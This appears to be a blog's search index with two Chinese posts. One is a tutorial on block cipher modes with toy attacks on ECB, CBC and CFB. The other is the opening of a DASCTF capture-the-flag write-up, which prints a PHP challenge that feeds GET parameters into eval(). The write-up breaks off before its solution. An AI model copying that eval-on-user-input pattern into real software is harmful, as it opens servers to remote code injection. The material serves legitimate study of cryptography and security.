<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>分组密码的模式</title>
    <url>/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="分组密码的模式"><a href="#分组密码的模式" class="headerlink" title="分组密码的模式"></a>分组密码的模式</h1><h2 id="分组密码与流密码"><a href="#分组密码与流密码" class="headerlink" title="分组密码与流密码"></a>分组密码与流密码</h2><p>密码算法可以分为分组密码和流密码两种。</p>
<p><strong>分组密码</strong>（block cipher）是每次只能处理特定长度的一块数据的一类密码算法，这里的“一块”就称为<strong>分组</strong>（block)。此外，一个分组的比特数就称为<strong>分组长度</strong>（block length)。</p>
<p>例如，DES 和三重 DES 的分组长度都是64比特。这些密码算法一次只能加密 64 比特的明文，并生成64比特的密文。AES 的分组长度可以从128 比特、192比特和256比特中进行选择。当选择 128 比特的分组长度时，AES一次可加密 128 比特的明文，并生成 128 比特的密文。</p>
<p><strong>流密码</strong>（streamcipher）是对数据流进行连续处理的一类密码算法。流密码中一般以1比特、8比特或32比特等为单位进行加密和解密。</p>
<p>分组密码处理完一个分组就结束了，因此不需要通过内部状态来记录加密的进度；相对地，流密码是对一串数据流进行连续处理，因此需要保持内部状态。</p>
<h2 id="什么是模式"><a href="#什么是模式" class="headerlink" title="什么是模式"></a>什么是模式</h2><p>分组密码算法只能加密周定长度的分组，但是我们需要加密的明文长度可能会超过分组密码的分组长度，这时就需要对分组密码算法进行迭代，以便将一段很长的明文全部加密。而迭代的方法就称为分组密码的模式 （mode）。说人话就是<strong>对分组密码加密的方式</strong>。在学习之前，我觉得大部分都会认为：如果明文很长的话，将明文分割成若干个分组再逐个加密不就好了吗？因为我自己就是这么认为的QAQ。事实上可没有那么简单。将明文分割成多个分组并逐个加密的方法称为 ECB模式，这种模式具有很大的弱点（后续介绍）。如果在编写加密软件使用 ECB 模式，会在不经意间产生安全漏洞，所以千万不能使用 ECB模式。</p>
<p>模式有很多种类，分组密码的主要模式有以下5种：</p>
<blockquote>
<p>ECB模式：Electronic CodeBook mode（电子密码本模式）</p>
<p>CBC模式：Cipher Block Chaining mode（密码分组链接模式）</p>
<p>CFB模式：Cipher FeedBack mode（密文反馈模式）</p>
<p>OFB模式：Output FeedBack mode（输出反馈模式）</p>
<p>CTR模式：CounTeR mode（计数器模式）</p>
</blockquote>
<span id="more"></span>

<h2 id="明文分组与密文分组"><a href="#明文分组与密文分组" class="headerlink" title="明文分组与密文分组"></a>明文分组与密文分组</h2><p>在了解各个模式之前，先来熟悉一下待会要接触的两个概念。</p>
<p><strong>明文分组</strong>是指分组密码算法中作为加密对象的明文。明文分组的长度与分组密码算法的分组长度是相等的。</p>
<p><strong>密文分组</strong>是指使用分组密码算法将明文分组加密之后所生成的密文。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420150609136.png" alt="image-20220420150609136" loading="lazy"></p>
<h1 id="ECB模式"><a href="#ECB模式" class="headerlink" title="ECB模式"></a>ECB模式</h1><p>将明文分组直接加密的方式就是ECB模式，这种模式是最简单的，也是最逊的，弱点很多，所以根本不用。</p>
<h2 id="什么是ECB模式"><a href="#什么是ECB模式" class="headerlink" title="什么是ECB模式"></a>什么是ECB模式</h2><p>ECB模式的全称是Electronic CodeBook 模式。<strong>在ECB模式中，将明文分组加密之后的结果将直接成为密文分组</strong>。</p>
<p>图示为（这边解密箭头有点问题，应该是密文-&gt;解密-&gt;明文，凑活看）：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420151016833.png" alt="image-20220420151016833" loading="lazy"></p>
<p>使用 ECB 模式加密时，相同的明文分组会被转换为相同的密文分组。可以将其理解为是一个巨大的“明文分组-&gt;密文分组”的对应表，因此 ECB 模式也称为<strong>电子密码本模式</strong>。当最后一个明文分组的内容小于分组长度时，需要用一些特定的数据进行<strong>填充</strong> (padding )。</p>
<h2 id="ECB模式的特点"><a href="#ECB模式的特点" class="headerlink" title="ECB模式的特点"></a>ECB模式的特点</h2><p>ECB 模式是所有模式中最简单的一种。ECB 模式中，明文分组与密文分组是一一对应的关系，因此，如果明文中存在多个相同的明文分组，则这此明文分组最终都将被转换为相同的密文分组。这样一来，只要观察一下密文，就可以知道明文中存在怎样的重复组合，并可以以此为线索来破译密码，因此 ECB 模式是存在一定风险的。</p>
<h2 id="对ECB模式的攻击"><a href="#对ECB模式的攻击" class="headerlink" title="对ECB模式的攻击"></a>对ECB模式的攻击</h2><p>ECB 模式中，每个明文分组都各自独立地进行加密和解密，但这其实是一个很大的弱点。假如存在主动攻击者，他能够改变密文分组的顺序。当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也会被改变。也就是说，<strong>攻击者无需破译密码就能够操纵明文</strong>。在这个场景中，攻击者不需要破译密码，也不需要知道分组密码算法，他只要知道哪个分组记录了什么样的数据（即电文的格式）就可以了。</p>
<p>看个简单的例子。假设分组长度为 128 比特（16字节），某银行的转账请求数据由以下了个分组构成：</p>
<blockquote>
<p>分组1&#x3D;付款人的银行账号<br>分组2&#x3D;收款人的银行账号<br>分组了&#x3D;转账金额</p>
</blockquote>
<p>银行在收到转账请求数据后，就会将数据中指定的金额从付款人的账户转移到收款人的账户中。现假设一个“从 A-5374 账户向 B-6671账户转账1亿元”的转账请求数据，用16进制数据表示如下：</p>
<blockquote>
<p>明文分组1&#x3D; 41 2D 35 33 37 34 20 20 20 20 20 20 20 20 20 20（付款人：A-5374)<br>明文分组2&#x3D; 42 2D 36 35 37 31 20 20 20 20 20 20 20 20 20 20（收款人：B-6671）<br>明文分组3&#x3D; 31 30 30 30 30 30 30 30 30 20 20 20 20 20 20 20（转账金额：100000000）</p>
</blockquote>
<p>下面我们将上述数据用 ECB 模式进行加密，从加密后的数据是看不出明文分组的内容的。</p>
<blockquote>
<p>密文分组1&#x3D; 59 7D DE CC EF EC BA 9B BF 83 99 CF 60 D2 59 B9（付款人：? ? ? ?）<br>密文分组2&#x3D; DF 49 2A 1C 14 8E 18 B6 53 1F 38 BD 5A A9 D7 D7（收款人：? ? ? ?)<br>密文分组3&#x3D; CD AF D5 9E 39 FE FD 5D 64 8B CC CB 52 56 8D 79（转账金额：? ? ? ?）</p>
</blockquote>
<p>接下来，攻击者将密文分组1和2的内容进行对调：</p>
<blockquote>
<p>密文分组1&#x3D; DF 49 2A 1C 14 8E 18 B6 53 1F 38 BD 5A A9 D7 D7（收款人：? ? ? ?)<br>密文分组2&#x3D; 59 7D DE CC EF EC BA 9B BF 83 99 CF 60 D2 59 B9（付款人：? ? ? ?）<br>密文分组3&#x3D; CD AF D5 9E 39 FE FD 5D 64 8B CC CB 52 56 8D 79（转账金额：? ? ? ?）</p>
</blockquote>
<p>攻击者只是对调了密文分组1和2的顺序，并没有试图破译密码。而银行对上述信息解密后，就会变成下面这样：</p>
<blockquote>
<p>明文分组1&#x3D; 42 2D 36 35 37 31 20 20 20 20 20 20 20 20 20 20（付款人：B-6671）<br>明文分组2&#x3D; 41 2D 35 33 37 34 20 20 20 20 20 20 20 20 20 20（收款人：A-5374)<br>明文分组3&#x3D; 31 30 30 30 30 30 30 30 30 20 20 20 20 20 20 20（转账金额：100000000）</p>
</blockquote>
<p>原本请求的内容是从 A-5374 账户向 B-6671 账户转账1亿元，现在却变成了从 B-5671 账户向 A-5374 账户转账1亿元，完全相反！通过这个例子可以看出，BCB模式的一大弱点就是可以在不破译密文的情况下操纵明文。在ECB 模式中，只要对任意密文分组进行替换，相应的明文分组也会被替换。此外，攻击者所能做的还不仅限于替换，例如，如果将密文分组删除，则相应的明文分组也会被删除；如果对密文分组进行复制，则相应的明文分组也会被复制。</p>
<h1 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h1><p>CBC模式是将前一个密文分组与当前明文分组的内容混合起来进行加密的，这样就可以避免ECB模式的弱点。</p>
<h2 id="什么是CBC模式"><a href="#什么是CBC模式" class="headerlink" title="什么是CBC模式"></a>什么是CBC模式</h2><p>CBC模式的全称是Cipher Block Chaining模式，因为它的密文分组像链条一样相互连接在一起，所以就叫这名儿。</p>
<p>在CBC模式中，<strong>首先将明文分组与前一个密文分组进行XOR运算（异或），然后再进行加密</strong>。</p>
<p>图示为（这边解密箭头有点问题，应该是密文-&gt;解密-&gt;XOR-&gt;明文，凑活看）：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420154157570.png" alt="image-20220420154157570" loading="lazy"></p>
<p>如果将一个分组的加密过程分离出来，就可以容易比较出ECB模式和CBC模式的区别。ECB模式只进行了加密，而CBC模式则在加密之前进行了一次XOR。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420154817529.png" alt="image-20220420154817529" loading="lazy"></p>
<h2 id="初始化向量"><a href="#初始化向量" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>当加密第一个明文分组时，由于不存在”前一个密文分组“，所以需要事先准备一个长度为一个分组的二进制序列来代替，这个序列称为<strong>初始化向量</strong>（initialization vector），通常缩写为 IV。一般来说，每次加密时都会随机产生一个不同的二进制序列来作为初始化向量。</p>
<h2 id="CBC模式的特点"><a href="#CBC模式的特点" class="headerlink" title="CBC模式的特点"></a>CBC模式的特点</h2><p>明文分组在加密之前一定会与”前一个密文分组“进行XOR运算，因此即便明文分组1和2的值是相等的，密文分组1和2的值也不一定是相等的。这样一来，ECB模式的缺陷在 CBC模式中就不存在了。</p>
<p>详细看一看 CBC 模式的加密过程。在CBC模式中，我们无法单独对一个中间的明文分组进行加密。例如，如果要生成密文分组 3，则至少需要凑齐明文分组 1、2、3才行。再来看看CBC模式的解密过程。现在假设CBC 模式加密的密文分组中有一个分组损坏了（例如由于硬盘故障导致密文分组的值发生了改变等）。在这种情况下，只要密文分组的长度没有发生变化，则解密时最多只会有2个分组受到数据损坏的影响。</p>
<p>图示为：<img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420155329177.png" alt="image-20220420155329177" loading="lazy"></p>
<p>假设CBC 模式的密文分组中有一些比特缺失了（例如由于通信错误导致没有收到某些比特等等），那么此时即便只缺失了1比特，也会导致密文分组的长度发生变化，此后的分组发生错位，这样一来，缺失比特的位置之后的密文分组也就全部无法解密了。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420155518425.png" alt="image-20220420155518425" loading="lazy"></p>
<h2 id="对CBC模式的攻击"><a href="#对CBC模式的攻击" class="headerlink" title="对CBC模式的攻击"></a>对CBC模式的攻击</h2><p>假设主动攻击者的目的是通过修改密文来操纵解密后的明文。如果攻击者能够对初始化向量中的任意比特进行反转（即将1变为0，将0变为1），则明文分组（解密后得到的明文分组）中相应的比特也会被反转。这是因为在CBC 模式的解密过程中，第一个明文分组会和初始化向量进行XOR运算。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420155622664.png" alt="image-20220420155622664" loading="lazy"></p>
<p>这样，攻击者就可以对初始化向量进行攻击，但是想要对密文分组也进行同样的攻击就非常困难。例如，攻击者将密文分组1中的某个比特进行了反转，则明文分组2中相应的比特也会被反转，然而这1比特的变化却会对解密后的密文分组1中的多个比特造成影响。说人话就是，攻击者只想让明文分组1产生所期望的特定变化是很蓝的啦。</p>
<h1 id="CFB模式"><a href="#CFB模式" class="headerlink" title="CFB模式"></a>CFB模式</h1><h2 id="什么是CFB模式"><a href="#什么是CFB模式" class="headerlink" title="什么是CFB模式"></a>什么是CFB模式</h2><p>CFB模式的全称是Cipher FeedBack模式。在CFB模式中，<strong>前一个密文分组会被送回到密码算法的输入端</strong>。所谓反馈（feedback），这里指的就是返回输入端的意思。</p>
<p>图示为（这边箭头没错了捏）：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420160236648.png" alt="image-20220420160236648" loading="lazy"></p>
<p>在ECB模式和CBC模式中，明文分组都是通过密码算法进行加密的。然而，在CFB模式中，明文分组并没有通过密码算法来直接进行加密。从图示可以看出明文分组和密文分组之间并没有经过“加密”这一步骤。在CFB 模式中，明文分组和密文分组之间只有一个XOR。</p>
<p>将 CBC 模式与 CFB 模式对比一下，就可以看出其中的差异了。在CBC模式中，明文分组和密文分组之间有XOR和密码算法两个步骤，而在CFB 模式中，明文分组和密文分组之间则只有 XOR。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420160620607.png" alt="image-20220420160620607" loading="lazy"></p>
<h2 id="初始化向量-1"><a href="#初始化向量-1" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>在生成第一个密文分组时，由于不存在前一个输出的数据，因此需要使用初始化向量（IV）来代替，这一点和CBC模式是相同的。一般来说，我们需要在每次加密时生成一个不同的随机二进制序列用作初始化向量。</p>
<h2 id="CFB模式与流密码"><a href="#CFB模式与流密码" class="headerlink" title="CFB模式与流密码"></a>CFB模式与流密码</h2><p>CFB 模式是通过将“明文分组”与“密码算法的输出“进行XOR运算来生成“密文分组”的。在CFB模式中，密码算法的输出相当于一次性密码本中的随机二进制序列。由于密码算法的输出是通过计算得到的，并不是真正的随机数，因此 CFB模式不可能像一次性密码本那样具备理论上不可破译的性质。</p>
<p>CFB 模式中由密码算法所生成的二进制序列称为<strong>密钥流</strong>（key stream）。在CFB模式中，密码算法就相当于用来生成密钥流的伪随机数生成器，而初始化向量就相当于伪随机数生成器的“种子”。在CFB模式中，明文数据可以被逐比特加密，因此我们<strong>可以将CFB模式看做是一种使用分组密码来实现流密码的方式</strong>。</p>
<h2 id="对CFB模式的解密"><a href="#对CFB模式的解密" class="headerlink" title="对CFB模式的解密"></a>对CFB模式的解密</h2><p>CFB 模式的解密过程见前图。CFB模式解密时，需要注意的是分组密码算法依然执行加密操作，因为<strong>密钥流是通过加密操作来生成的</strong>。</p>
<h2 id="对CFB模式的攻击"><a href="#对CFB模式的攻击" class="headerlink" title="对CFB模式的攻击"></a>对CFB模式的攻击</h2><p>对 CFB 模式可以实施<strong>重放攻击</strong> （replay attack）。</p>
<p>举个不恰当的例子。有一天，lbw向tx发送了一条消息，这条消息由4个密文分组组成。主动攻击者将该消息中的后了个密文分组保存了下来。转天，lbw又向tx发送了内容不同的4个密文分组（假设lbw使用了相同的密钥)。攻击者用昨天保存下来的3个密文分组将今天发送的后3个密文分组进行了替换。于是，当tx解密时，4个分组中就只有第1个可以解密成正确的明文分组，第2个会出错，而第3个和第4个则变成了被攻击者替换的内容（也就是昨天发送的明文内容）。这边解释一下：明文分组2出错是因为密文分组1是正确的，经过加密形成的密钥流也是正确的，但是密文分组2是错误的，所以明文分组2出错；而明文分组3和4是以前的明文分组是因为密文分组2和3都是昨天的内容，所以加密之后进行XOR运算得到的是以前的明文分组。可以看到，攻击者没有破解密码，就成功地将以前的电文混入了新电文中。而第2个分组出错到底是通信错误呢，还是被人攻击所造成的呢？tx是无法做出判断的。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420161353849.png" alt="image-20220420161353849" loading="lazy"></p>
<h1 id="OFB模式"><a href="#OFB模式" class="headerlink" title="OFB模式"></a>OFB模式</h1><h2 id="什么是OFB模式"><a href="#什么是OFB模式" class="headerlink" title="什么是OFB模式"></a>什么是OFB模式</h2><p>OFB模式的全称是Output FeedBack模式。在OFB模式中，<strong>密码算法的输入会反馈到密码算法的输入中</strong>。</p>
<p>OFB模式并不是通过密码算法对明文直接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的，在这一点上OFB模式和CFB模式非常相似。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420161950688.png" alt="image-20220420161950688" loading="lazy"></p>
<h2 id="初始化向量-2"><a href="#初始化向量-2" class="headerlink" title="初始化向量"></a>初始化向量</h2><p>和CBC、CBF一样，OFB模式也需要使用初始化向量。一般来说，我们需要在每次加密时生成一个不同的随机二进制序列用作初始化向量。</p>
<h2 id="CFB模式与OFB模式的对比"><a href="#CFB模式与OFB模式的对比" class="headerlink" title="CFB模式与OFB模式的对比"></a>CFB模式与OFB模式的对比</h2><p>OFB模式和CFB模式的区别仅仅在于密码算法的输入。</p>
<p>CFB模式中，密码算法的输入是前一个密文分组，也就是将密文分组反馈到密码算法中，因此就有了“密文反馈模式”这个名儿。</p>
<p>相对的，OFB模式中，密码算法的输入则是密码算法的前一个输出，也就是将输出反馈回密码算法，因此就有了“输出反馈模式”这个名儿。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420162329421.png" alt="image-20220420162329421" loading="lazy"></p>
<p>由于CFB模式中是对密文分组进行反馈的，因此必须从第一个明文分组开始按顺序进行加密，也就是说无法跳过明文分组1而先对明文分组2进行加密。相对地，在OFB模式中，XOR所需要的比特序列（密钥流）可以事先通过密码算法生成，和明文分组无关。只要提前准备好所需的密钥流，则在实际从明文生成密文的过程中，就完全不需要动用密码算法了，只要将明文与密钥流进行XOR就可以了。这就意味着只要提前准备好密钥流就可以快速完成加密。换个角度来看，生成密钥流的操作和进行XOR运算的操作是可以并行的。</p>
<h1 id="CTR模式"><a href="#CTR模式" class="headerlink" title="CTR模式"></a>CTR模式</h1><h2 id="什么是CTR模式"><a href="#什么是CTR模式" class="headerlink" title="什么是CTR模式"></a>什么是CTR模式</h2><p>CTR 模式的全称是CounTeR 模式。CTR 模式是一种<strong>通过将逐次累加的计数器进行加密来生成密钥流的流密码</strong>。</p>
<p>CTR 模式中，每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流。也就是说，最终的密文分组是通过将计数器加密得到的比特序列，与明文分组进行XOR而得到的。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420162635732.png" alt="image-20220420162635732" loading="lazy"></p>
<h2 id="计数器的生成方法"><a href="#计数器的生成方法" class="headerlink" title="计数器的生成方法"></a>计数器的生成方法</h2><p>每次加密时都会生成一个不同的值（nonce）来作为计数器的初始值。当分组长度为128比特（16字节）时，计数器的初始值可能是类似于下面这种形式：</p>
<blockquote>
<p>66 1F 98 CD 37 A3 8B 4B 00 00 00 00 00 00 00 01</p>
<p>————nonce————- |———分组序号————</p>
</blockquote>
<p>其中前8个字节为nonce，这个值在每次加密时必须都是不同的。后8个字节为分组序号，这个部分是会逐次累加的。在加密过程中，计数器的值会产生如下变化：</p>
<blockquote>
<p>66 1F 98 CD 37 A3 8B 4B 00 00 00 00 00 00 00 01    明文分组1的计数器（初始值）</p>
<p>66 1F 98 CD 37 A3 8B 4B 00 00 00 00 00 00 00 02    明文分组2的计数器</p>
<p>66 1F 98 CD 37 A3 8B 4B 00 00 00 00 00 00 00 03    明文分组3的计数器</p>
<p>66 1F 98 CD 37 A3 8B 4B 00 00 00 00 00 00 00 04    明文分组4的计数器</p>
<p>​							          …                                                               …</p>
</blockquote>
<p>按照上述生成方法，可以保证计数器的值每次都不同。由于计数器的值每次都不同，因此每个分组中将计数器进行加密所得到的密钥流也是不同的。也就是说，这种方法是用分组密码来模拟生成随机的比特序列。</p>
<h2 id="OFB模式与CTR模式的对比"><a href="#OFB模式与CTR模式的对比" class="headerlink" title="OFB模式与CTR模式的对比"></a>OFB模式与CTR模式的对比</h2><p>CTR模式和OFB模式一样，都属于流密码。OFB模式是将加密的输出反馈到输入，而CTR模式则是将计数器的值用作输入。</p>
<p>图示为：</p>
<p><img src="/2022/04/20/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%A8%A1%E5%BC%8F/image-20220420164132143.png" alt="image-20220420164132143" loading="lazy"></p>
<h2 id="CTR模式的特点"><a href="#CTR模式的特点" class="headerlink" title="CTR模式的特点"></a>CTR模式的特点</h2><p>CTR模式的加密和解密使用了完全相同的结构，这个特点和OFB模式一样。</p>
<p>此外，CTR模式中可以以任意顺序对分组进行加密和解密，因此在加密和解密时需要用到的“计数器”的值可以由nonce和分组序号直接计算出来。这一性质是OFB模式所不具备的。能够以任意顺序处理分组，就意味着能够实现并行计算。在支持并行计算的系统中，CTR<br>模式的速度是非常快的。</p>
<h2 id="错误性与机密性"><a href="#错误性与机密性" class="headerlink" title="错误性与机密性"></a>错误性与机密性</h2><p>错误与机密性方面，CTR 模式也具备和OFB模式差不多的性质。假设CTR模式的密文分组中有一个比特被反转了，则解密后明文分组中仅有与之对应的比特会被反转，这一错误不会放大。</p>
<p>换言之，在CTR 模式中，主动攻击者可以通过反转密文分组中的某些比特，引起解密后明文中的相应比特也发生反转。这一弱点和OFB模式是相同的。不过CTR模式具备一个比OF 模式要好的性质。在OFB模式中，如果对密钥流的一个分组进行加密后其结果碰巧和加密前是相同的，那么这一分组之后的密钥流就会变成同一值的不断反复。在CTR模式中就不存在这一问题。</p>
<h1 id="应该使用那种模式-？"><a href="#应该使用那种模式-？" class="headerlink" title="应该使用那种模式 ？"></a>应该使用那种模式 ？</h1><table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">优点</th>
<th align="left">缺点</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ECB模式</td>
<td align="left">● 简单 <br>● 快速<br>● 支持并行计算（加密、解密）</td>
<td align="left">● 明文中的重复排列会反应在密文中<br>● 通过删除、替换密文分组可对明文进行操控<br>● 对包含某些比特错误的密文进行解密时，对应的分组会出错<br>● 不能低于重放攻击</td>
<td align="center">不应使用</td>
</tr>
<tr>
<td align="center">CBC模式</td>
<td align="left">● 明文中的重复排列不会反应在密文中 <br>● 能够解密任意密文分组<br>● 支持并行计算（仅解密）</td>
<td align="left">● 对包含某些比特错误的密文进行解密时，第一个分组的全部比特以及后一组的相应比特会出错<br>● 加密不支持并行运算</td>
<td align="center">推荐使用</td>
</tr>
<tr>
<td align="center">CFB模式</td>
<td align="left">● 不需要填充 <br>● 能够解密任意密文分组<br>● 支持并行计算（仅解密）</td>
<td align="left">● 加密不支持并行运算<br>● 对包含某些比特错误的密文进行解密时，第一个分组的全部比特以及后一组的相应比特会出错<br>● 不能低于重放攻击</td>
<td align="center">推荐用CTR模式代替</td>
</tr>
<tr>
<td align="center">OFB模式</td>
<td align="left">● 不需要填充 <br>● 可事先进行加密、解密的准备<br>● 加密解密使用相同的结构<br>● 对包含某些错误比特的密文进行解密时，只有明文中相应的比特才会出错</td>
<td align="left">● 不支持并行运算 <br>● 主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td>
<td align="center">推荐用CTR模式代替</td>
</tr>
<tr>
<td align="center">CTR模式</td>
<td align="left">● 不需要填充 <br>● 可事先进行加密、解密的准备<br>● 加密解密使用相同的结构<br>● 对包含某些错误比特的密文进行解密时，只有明文中相应的比特才会出错<br>● 支持并行计算（加密、解密）</td>
<td align="left">主动攻击者反转密文分组中的某些比特时，明文分组中相应的比特也会被反转</td>
<td align="center">推荐使用</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>ECB、CBC、CFB、OFB、CTR</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF Oct X 迷路的魔法少女</title>
    <url>/2022/04/21/DASCTF-Oct-X-%E8%BF%B7%E8%B7%AF%E7%9A%84%E9%AD%94%E6%B3%95%E5%B0%91%E5%A5%B3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h1 id="观察源码"><a href="#观察源码" class="headerlink" title="观察源码"></a>观察源码</h1><p>进入靶场发现直接给了源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$array = <span class="token interpolation"><span class="token variable">$data</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'array('</span><span class="token punctuation">;</span>
        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"=>'</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$attrstr</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$attrstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>先来看看其中的<code>String2Array()</code>函数，我在<a href="https://blog.csdn.net/weixin_36440677/article/details/115629343">其它博客</a>中看到了这么个说法：</p>
<blockquote>
<p>PHP CMS中 很常用的string2array函数：</p>
